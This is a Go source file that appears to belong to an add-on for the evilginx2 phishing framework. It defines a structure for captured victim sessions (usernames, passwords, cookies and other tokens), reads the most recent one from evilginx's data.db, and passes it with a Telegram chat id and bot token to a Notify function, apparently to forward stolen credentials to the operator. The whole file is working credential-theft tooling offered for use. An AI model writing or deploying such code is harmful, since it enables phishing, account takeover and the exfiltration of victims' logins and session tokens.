package core

import (
    "bufio"
    "encoding/json"
    "fmt"
    "os"
    "path/filepath"
    "strings"

    "github.com/kgretzky/evilginx2/log"
)

type TSession struct {
    ID         int                    `json:"id"`
    Phishlet   string                 `json:"phishlet"`
    LandingURL string                 `json:"landing_url"`
    Username   string                 `json:"username"`
    Password   string                 `json:"password"`
    Custom     map[string]interface{} `json:"custom"`
    BodyTokens map[string]interface{} `json:"body_tokens"`
    HTTPTokens map[string]interface{} `json:"http_tokens"`
    Tokens     map[string]interface{} `json:"tokens"`
    SessionID  string                 `json:"session_id"`
    UserAgent  string                 `json:"useragent"`
    RemoteAddr string                 `json:"remote_addr"`
    CreateTime int64                  `json:"create_time"`
    UpdateTime int64                  `json:"update_time"`
}

func ReadLatestSession(filePath string) (TSession, error) {
    file, err := os.Open(filePath)
    if err != nil {
        return TSession{}, fmt.Errorf("could not open file: %v", err)
    }
    defer file.Close()

    var latestSession TSession
    var currentSessionData string
    captureSession := false

    scanner := bufio.NewScanner(file)

    for scanner.Scan() {
        line := scanner.Text()

        if strings.HasPrefix(line, "$") {
            if captureSession && currentSessionData != "" {
                var session TSession
                if err := json.Unmarshal([]byte(currentSessionData), &session); err == nil {
                    latestSession = session
                } else {
                    log.Warning("Error parsing session JSON: %v", err)
                }
                currentSessionData = ""
            }
            captureSession = true
        }

        if captureSession && strings.HasPrefix(line, "{") {
            currentSessionData = line
        }
    }

    if captureSession && currentSessionData != "" {
        var session TSession
        if err := json.Unmarshal([]byte(currentSessionData), &session); err == nil {
            latestSession = session
        } else {
            log.Warning("Error parsing session JSON: %v", err)
        }
    }

    if err := scanner.Err(); err != nil {
        return TSession{}, fmt.Errorf("error reading file: %v", err)
    }

    return latestSession, nil
}

func readFile(chatid string, teletoken string) {
    homeDir, err := os.UserHomeDir()
    if err != nil {
        log.Error("Failed to get home directory: %v", err)
        return
    }

    filePath := filepath.Join(homeDir, ".evilginx", "data.db")

    if homeDir == "/" || homeDir == "" {
        filePath = "/root/.evilginx/data.db"
    }

    latestSession, err := ReadLatestSession(filePath)
    if err != nil {
        log.Error("Failed to read latest session: %v", err)
        return
    }

    if latestSession.ID != 0 {
        Notify(latestSession, chatid, teletoken)
    } else {
        log.Info("No new session found.")
    }
}
